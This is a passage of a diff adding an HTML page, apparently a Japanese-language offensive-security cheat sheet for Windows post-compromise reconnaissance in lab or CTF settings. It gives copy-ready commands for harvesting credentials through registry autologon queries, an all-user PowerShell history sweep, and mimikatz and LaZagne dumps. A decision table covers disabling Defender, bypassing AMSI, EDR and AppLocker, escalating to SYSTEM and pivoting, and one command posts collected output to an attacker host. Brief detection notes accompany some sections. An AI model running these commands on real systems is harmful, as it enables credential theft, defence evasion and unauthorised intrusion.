+<pre><code>reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
+reg query "HKCU\Software\Microsoft\FTP" /s
+reg query "HKCU\Software\OpenSSH" /s
+reg query "HKLM\SOFTWARE\RealVNC" /s
+reg query "HKLM\SOFTWARE\TightVNC" /s
+
+<span class="c"># Autologon (平文 password 保管の代表)</span>
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName</code></pre></div>
+
+      <h3>PowerShell 履歴 (機密情報の宝庫)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># 自ユーザの ConsoleHost_history.txt (PSReadLine)</span>
+Get-Content (Get-PSReadlineOption).HistorySavePath
+
+<span class="c"># 全ユーザの history 一括</span>
+Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt `
+  -Force -ErrorAction SilentlyContinue `
+  | ForEach-Object { Write-Host "=== $_ ==="; Get-Content $_ }</code></pre></div>
+
+      <h3>Script Block Logging 内の credential</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># EID 4104 から password / secret / credential / key / token を検索</span>
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} `
+  | Where-Object { $_.Message -match "password|secret|credential|key|token" } `
+  | Select-Object TimeCreated, Message `
+  | Format-List</code></pre></div>
+
+      <h3>共有内探索</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># PowerView 経由の探索</span>
+Find-DomainShare -CheckShareAccess
+Find-InterestingDomainShareFile -Include @("*pass*","*cred*","*config*",".kdbx",".bak")
+
+<span class="c"># Snaffler (自動化、高速)</span>
+.\Snaffler.exe -d $env:USERDNSDOMAIN -o C:\Windows\Tasks\snaffler.log -v Data</code></pre></div>
+
+      <h3>LSASS メモリ (要 Admin)</h3>
+      <p>Section 03 で <code>RunAsPPL=0</code> かつ <code>LsaCfgFlags=0</code> を確認済みの場合。詳細は <a href="active-directory.html">AD sheet</a> の credential dump 節を参照。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"
+mimikatz "privilege::debug" "sekurlsa::ekeys" "exit"
+mimikatz "privilege::debug" "lsadump::sam" "exit"
+mimikatz "privilege::debug" "lsadump::secrets" "exit"
+mimikatz "privilege::debug" "lsadump::cache" "exit"
+mimikatz "vault::list" "vault::cred /patch" "exit"</code></pre></div>
+
+      <h3>ブラウザ / ツール credential (LaZagne)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div>
+<pre><code>LaZagne.exe all -v</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>LSASS への Handle 取得は Sysmon EID 10 (ProcessAccess) で GrantedAccess=0x1010/0x1410 等のパターン検知</li>
+          <li>ETW-Ti (Microsoft-Windows-Threat-Intelligence) は Kernel 側で発火、userland patch 無効</li>
+          <li>Autologon レジストリ読取 (<code>DefaultPassword</code>) は業務ではほぼ発生しない → high fidelity signal</li>
+          <li>PowerShell history の全ユーザ一括読取は EDR で anomaly、そもそも history は無効化推奨 (<code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>)</li>
+          <li>Snaffler / Find-InterestingDomainShareFile の共有走査は SMB access log で「単一ホスト → 多共有への短時間アクセス」として検出</li>
+          <li>Unattend / Sysprep XML への <code>findstr password</code> は正規業務では 0 回、Sysmon EID 11 で file access 監査</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s08" class="reveal">
+      <h2><span class="num">08</span>Decision Matrix<span class="jp">次アクション判断表</span></h2>
+      <p>Section 01-07 で収集した情報を、次に取るアクションへ変換するための cross-reference。</p>
+
+      <h3>防御層 → 回避手法</h3>
+      <table>
+        <thead><tr><th>検出された防御</th><th>推奨次手</th></tr></thead>
+        <tbody>
+          <tr><td>Defender Only (TamperProtection=False)</td><td><code>Set-MpPreference -DisableRealtimeMonitoring $true</code> (<a href="evasion.html#s06">evasion 06</a>)</td></tr>
+          <tr><td>Defender + TamperProtection=True</td><td>サービス停止 (<code>sc stop WinDefend</code>) / レジストリ hive 直接編集</td></tr>
+          <tr><td>Defender + ScriptBlockLogging=True</td><td>C# .NET アセンブリ実行 (PowerShell 回避)</td></tr>
+          <tr><td>MDE (MsSense.exe)</td><td>Direct Syscall + ETW patch + .NET reflection (<a href="evasion.html#s09">evasion 09</a>)</td></tr>
+          <tr><td>CrowdStrike / SentinelOne</td><td>ntdll unhook + Direct Syscall + 暗号化 shellcode</td></tr>
+          <tr><td>AppLocker + ConstrainedLanguage</td><td>bypass-clm → InstallUtil (<a href="evasion.html#s03">evasion 03</a>)</td></tr>
+          <tr><td>AppLocker のみ</td><td><code>C:\Windows\Tasks\</code> 経由 InstallUtil / MSBuild (<a href="evasion.html#s02">evasion 02</a>)</td></tr>
+          <tr><td>AMSI 有効</td><td>amsiInitFailed patch → ペイロード読込 (<a href="evasion.html#s04">evasion 04</a>)</td></tr>
+          <tr><td>AMSI + ScriptBlockLogging</td><td>難読化 (Invoke-Obfuscation) と .NET 移行を併用</td></tr>
+          <tr><td><code>RunAsPPL=1</code></td><td>mimidrv.sys / PPLKiller (<a href="evasion.html#s07">evasion 07</a>)</td></tr>
+          <tr><td>Credential Guard (LsaCfgFlags=1)</td><td>Kerberos TGT (Rubeus) のみ狙う (<a href="active-directory.html">AD sheet</a>)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>権限 → 昇格ルート</h3>
+      <table>
+        <thead><tr><th>現在の権限</th><th>推奨ルート</th></tr></thead>
+        <tbody>
+          <tr><td>Standard User</td><td>PowerUp → 脆弱サービス / Watson → カーネル exploit</td></tr>
+          <tr><td>Standard User + UAC Medium</td><td>fodhelper / ComputerDefaults (<a href="evasion.html#s05">evasion 05</a>)</td></tr>
+          <tr><td>サービスアカウント (SeImpersonate)</td><td>PrintSpoofer / GodPotato → SYSTEM (<a href="evasion.html#s08">evasion 08</a>)</td></tr>
+          <tr><td>Local Admin (Medium Integrity)</td><td>UAC bypass → High → Defender 無効化</td></tr>
+          <tr><td>Local Admin (High Integrity)</td><td>mimikatz → 横展開 / DA 狙い</td></tr>
+          <tr><td>SYSTEM</td><td>Section 06 (AD) → Section 07 (creds) → DA</td></tr>
+        </tbody>
+      </table>
+
+      <h3>横展開可能性 → ピボット手法</h3>
+      <table>
+        <thead><tr><th>状況</th><th>推奨ピボット</th></tr></thead>
+        <tbody>
+          <tr><td>egress 443/80 のみ</td><td>reverse_https + ligolo-ng (port 443)</td></tr>
+          <tr><td>egress 全閉鎖</td><td>bind shell + 横展開先経由 pivot</td></tr>
+          <tr><td>egress 53 のみ</td><td>DNS tunneling (dnscat2 / iodine)</td></tr>
+          <tr><td>内部多段</td><td>ligolo-ng (Linux) / chisel (Windows)</td></tr>
+          <tr><td>Linux ホスト経由</td><td><code>ssh -D</code> (SOCKS proxy) + proxychains</td></tr>
+          <tr><td>Meterpreter 保有</td><td>autoroute + socks_proxy + proxychains</td></tr>
+        </tbody>
+      </table>
+    </section>
+
+    <section id="s09" class="reveal">
+      <h2><span class="num">09</span>Order &amp; Key Takeaways<span class="jp">実行順序と要点</span></h2>
+
+      <h3>Execution order</h3>
+      <ol>
+        <li><strong>Section 01 は侵入後 30 秒以内に完了</strong> — <code>whoami /all</code> だけは必ず即時実行</li>
+        <li><strong>AMSI bypass 前の偵察は <code>cmd.exe</code> 優先</strong> — PowerShell コマンドは AMSI / ScriptBlockLogging で全捕捉されうる</li>
+        <li><strong>Section 03 完了前に攻撃ペイロードを投入しない</strong> — 防御層を知らずに動くと EDR 即検知</li>
+        <li><strong>BloodHound (Section 06) は侵害ホスト数が増えてから</strong> — 単一ホストからの全ドメイン収集は明確な signature</li>
+        <li><strong>Section 07 は権限昇格後に実施</strong> — Standard ユーザで mimikatz は無意味</li>
+        <li><strong>新規ホスト侵害ごとに Section 01→03 を再実行</strong> — 各ホストで防御プロファイルが異なる</li>
+      </ol>
+
+      <h3>ノイズ最小化</h3>
+      <ul>
+        <li><code>whoami /all</code> 1 コマンドで権限・グループ・整合性・SID が一括取得</li>
+        <li><code>systeminfo</code> は 1 回で OS / Arch / Patch / Domain が揃う</li>
+        <li>PowerShell 実行時は <code>-NoProfile -NonInteractive -ExecutionPolicy Bypass</code> でプロファイルロード抑制</li>
+        <li>大量列挙時は <code>-ErrorAction SilentlyContinue</code> でエラーログを汚さない</li>
+        <li>結果はターゲット側に書かず attacker 側に転送: <code>Invoke-RestMethod -Uri http://&lt;LHOST&gt; -Method Post -Body $output</code></li>
+      </ul>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li><code>whoami /all</code> は侵入直後の絶対実行コマンド、これだけで権限・整合性・特権の 3 要素が判明し後続の分岐が決まる</li>
+          <li>アーキ判定 (<code>Is64BitProcess</code>) はペイロード生成の前提、確認せず <code>-f csharp</code> で shellcode 生成すると 32bit 環境で確実に失敗</li>
+          <li>Section 03 (防御検出) を省略すると EDR に即捕捉される、ペイロード投入前に AV/EDR/AMSI/CLM/AppLocker の 5 項目は必ず確認</li>
+          <li>PowerShell は AMSI / ScriptBlockLogging で監視されている前提、初期偵察は <code>cmd.exe</code> + <code>reg</code>/<code>sc</code>/<code>wmic</code> を優先する方が安全</li>
+          <li>TamperProtection と Credential Guard の有無は攻略時間を大きく左右する、Section 03 で確実に判定</li>
+          <li>各ホスト侵害時に Section 01→03 を再実行することが flag 取得の安定性を担保、前ホストの環境前提を引き継いでも次では通用しない</li>
+          <li>BloodHound (Section 06) は SharpHound の CollectionMethod を <code>DCOnly</code> から始めることで初動の検知リスクを最小化</li>
+        </ul>
+      </div>
+
+      <h3>References</h3>
+      <ul>
+        <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a> — AD enumeration</li>
+        <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp</a> — Windows local privesc audit</li>
+        <li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener">winPEAS</a> — automated privesc enumeration</li>
+        <li><a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener">Seatbelt</a> — .NET host survey</li>
+        <li><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener">Watson</a> — Windows exploit suggester</li>
+        <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound / SharpHound</a> — AD attack path analysis</li>
+        <li><a href="https://github.com/SnaffCon/Snaffler" target="_blank" rel="noopener">Snaffler</a> — high-speed share hunting</li>
+        <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS Project</a> — Living-off-the-Land binaries</li>
+      </ul>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Situational Awareness</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
